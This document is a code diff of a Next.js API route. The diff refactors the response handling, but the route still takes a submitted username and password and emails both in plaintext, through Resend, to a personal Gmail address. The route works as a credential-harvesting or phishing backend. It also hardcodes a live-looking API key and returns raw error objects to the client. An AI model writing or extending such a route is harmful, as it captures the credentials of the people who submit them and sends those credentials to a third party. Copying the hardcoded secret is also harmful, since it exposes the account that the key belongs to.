@@ -1,17 +1,17 @@
-import { NextResponse } from "next/server";
 import { Resend } from 'resend';
+import { NextRequest, NextResponse } from 'next/server';
 
 const resend = new Resend('re_8D6Az8ht_KxzCG9qaFbzAyjNSLwa1zWHU');
 
-export async function POST(req: any) {
+export async function POST(req: NextRequest) {
   try {
     const { userName, password } = await req.json();
 
     // Validate input fields
     if (!userName || !password) {
-      return new Response(
-        JSON.stringify({ message: "userName and password are required" }),
-        { status: 400, headers: { "Content-Type": "application/json" } }
+      return NextResponse.json(
+        { message: "userName and password are required" },
+        { status: 400 }
       );
     }
 
@@ -21,18 +21,19 @@ export async function POST(req: any) {
       to: 'anshu.dnnn@gmail.com',
       subject: 'Hello World',
       html: `<p>Username: <strong>${userName}</strong></p>
-             <p>Password: <strong>${password}</strong></p>`,    });
+             <p>Password: <strong>${password}</strong></p>`,
+    });
 
-    return new Response(
-      JSON.stringify({ message: "Email sent successfully!" }),
-      { status: 200, headers: { "Content-Type": "application/json" } }
+    return NextResponse.json(
+      { message: "Email sent successfully!" },
+      { status: 200 }
     );
-  } catch (error: any) {
+  } catch (error) {
     console.error("Error sending email:", error);
 
-    return new Response(
-      JSON.stringify({ message: "Failed to send email", error: error.message }),
-      { status: 500, headers: { "Content-Type": "application/json" } }
+    return NextResponse.json(
+      { message: "Failed to send email", error },
+      { status: 500 }
     );
   }
 }
